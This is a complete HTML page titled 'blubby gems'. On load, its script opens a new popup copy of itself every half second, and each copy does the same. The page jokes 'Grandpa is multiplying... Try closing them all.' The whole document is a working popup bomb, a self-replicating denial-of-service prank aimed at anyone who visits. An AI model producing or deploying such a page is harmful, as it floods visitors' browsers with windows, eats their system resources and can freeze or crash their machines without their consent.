<!DOCTYPE html>
<html>
<head>
<title>blubby gems</title>
<script>
function spawn() {
  setInterval(() => {
    let w = window.open(window.parent.location.href, "_blank", "width=300,height=200");
    if (w) {
      try { window.opener = null; } catch(e) {}
    }
  }, 500);
}

window.onload = spawn;
</script>
</head>
<body>
<h1>👴 Grandpa is multiplying...</h1>
<p>Try closing them all.</p>
</body>
</html>
